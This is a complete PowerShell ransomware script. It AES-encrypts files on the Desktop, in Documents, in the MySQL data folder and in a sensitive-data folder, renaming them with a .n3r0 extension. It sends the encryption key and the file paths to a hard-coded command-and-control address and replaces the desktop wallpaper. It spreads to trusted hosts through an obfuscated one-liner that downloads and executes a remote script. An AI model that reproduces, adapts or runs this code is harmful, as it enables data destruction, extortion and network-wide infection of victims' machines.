# Design
$ProgressPreference = "SilentlyContinue";
$ErrorActionPreference = "SilentlyContinue";
$WarningPreference = "SilentlyContinue";

# Variables
$Directory = @("C:\xampp\mysql\data\","$($env:USERPROFILE)\Desktop","$($env:USERPROFILE)\Documents","C:\SensitiveData\");
$C2Server = "192.168.40.11";

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;

function Invoke-Enc {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $aesManaged = New-Object System.Security.Cryptography.AesManaged;
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;
      $aesManaged.BlockSize = 128;
      $aesManaged.KeySize = 256 };

   Process {
      try {
         $aesManaged.Key = $PSRKey;
         if ($Path) {
            $File = Get-Item -Path $Path -ErrorAction SilentlyContinue;
            if ($File.FullName) {
            $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName);
   
            $encryptor = $aesManaged.CreateEncryptor();
            if ($plainBytes.Length -le $aesManaged.BlockSize) {
               $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)}
            else {$encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $aesManaged.BlockSize)+$plainBytes[$($aesManaged.BlockSize)..$($plainBytes.Length-1)]}
   
            [System.IO.File]::WriteAllBytes($File.FullName, $encryptedBytes);
            Move-Item -Path $File.FullName -Destination $($File.FullName + ".n3r0");
            (Get-Item $($File.FullName + ".n3r0")).LastWriteTime = $File.LastWriteTime; }}}
      catch {}}

   End {
         $aesManaged.Dispose();}}

Function RemoveWallpaper() {
Invoke-WebRequest -useb "http://$($C2Server)/bg.jpg" -Outfile $env:temp\bg.jpg;
Copy-Item -Path $env:temp\bg.jpg -Destination $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper -Force;
Copy-Item -Path $env:temp\bg.jpg -Destination "$(Get-ItemProperty 'HKCU:\Control Panel\Desktop').Wallpaper" -Force;
rundll32.exe user32.dll, UpdatePerUserSystemParameters;
rundll32.exe user32.dll, UpdatePerUserSystemParameters; }

function EncryptFiles {
    foreach ($d in $Directory) {
    if (Test-Path $d) {
    foreach ($i in $(Get-ChildItem $d -recurse -exclude *.n3r0 | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-WebRequest -useb "http://$($C2Server):45678/" -Method Post -Headers @{"Content-Type"="application/json"} -Body $(@{"hostname"=$env:COMPUTERNAME;"file"="$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($i)))"}|ConvertTo-Json) 2>&1> $null;
      Invoke-Enc -Path $i; }}}}

function NetDiscover {
   $iplist = $(Get-ChildItem WSMan:\localhost\Client\TrustedHosts).Value
   if($iplist -like '*,*') {
      foreach ($x in $($iplist.replace(" ", "")).split(',')) {
            Invoke-Command -Computername $x -Scriptblock {[STriNg]::JoIn('',(Ne`w-Obj`ect Net.WebC`lient).DowNloAdSTrIng('ht'+'tp://1'+'92.16'+'8.40.1'+'1/'+'a.p'+'s'+'1'))|&($eNV:cOMSpEC[4,26,25]-join'')} }} else {Invoke-Command -Computername $iplist -Scriptblock {[STriNg]::JoIn('',(Ne`w-Obj`ect Net.WebC`lient).DowNloAdSTrIng('ht'+'tp://1'+'92.16'+'8.40.1'+'1/'+'a.p'+'s'+'1'))|&($eNV:cOMSpEC[4,26,25]-join'')} }}

# Main
RemoveWallpaper;
# Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
# Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
$shaManaged = New-Object System.Security.Cryptography.SHA256Managed;
$PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_});
$PSRKey = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($PSRKey));
$shaManaged.Dispose();
Invoke-WebRequest -useb "http://$($C2Server):45678/" -Method Post -Headers @{"Content-Type"="application/json";} -Body $(@{"hostname"=$env:COMPUTERNAME;"key"=[System.Convert]::ToBase64String($PSRKey)}|ConvertTo-Json) 2>&1> $null;
# Write-Host "[!] Encrypting all files with 256 bits AES key.. " -ForegroundColor Red
NetDiscover;
EncryptFiles;
